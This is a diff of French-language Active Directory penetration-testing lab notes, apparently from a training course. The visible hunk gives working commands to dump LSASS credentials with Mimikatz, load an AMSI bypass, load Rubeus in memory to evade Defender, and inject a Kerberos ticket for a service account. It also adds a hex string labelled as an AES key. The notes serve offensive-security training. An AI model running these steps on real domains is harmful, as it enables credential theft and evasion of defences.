@@ -92,12 +92,14 @@ Invoke-Mimi -Command '"sekurlsa::minidump C:\AD\Tools\lsass.dmp" "sekurlsa::ekey
 > Loader lance Rubeus dans un **process séparé** où le Defender local est actif → Rubeus bloqué, **zéro sortie**. Le bypass AMSI ne patche QUE la session PowerShell courante. Solution : charge Rubeus **en mémoire dans cette session** (comme Invoke-Mimi).
 
 ```powershell
-iex (Get-Content C:\AD\Tools\amsibypass.txt -Raw)
+iex (Get-Content C:\AD\Tools\Amsi-Byp.txt  -Raw)
 $a=[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("C:\AD\Tools\Rubeus.exe"))
 $a.EntryPoint.Invoke($null,@(,[string[]]@("asktgt","/user:svcadmin","/aes256:<clé_aes256_svcadmin>","/opsec","/ptt")))
 klist
 ```
 → `klist` montre un **TGT `krbtgt/DOLLARCORP` pour svcadmin** (un **ticket**, pas un mot de passe — c'est ça la preuve). `/ptt` injecte dans la session courante.
+
+aes mac  : 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
 
 > [!warning] `asktgt /ptt` injecte DÉJÀ — ne relance pas un `ptt` séparé
 > Le `/ptt` d'`asktgt` a **déjà** importé le TGT (`[+] Ticket successfully imported!`). Refaire un `Rubeus.exe ptt /ticket:<base64>` derrière est **redondant** et échoue en général (`[X]/ticket:X must either be a .kirbi file or a base64 encoded .kirbi`) : le base64 se **casse au copier-coller** (wrap console = retours ligne/espaces injectés). Ta preuve = **`klist`**, pas l'output Rubeus.
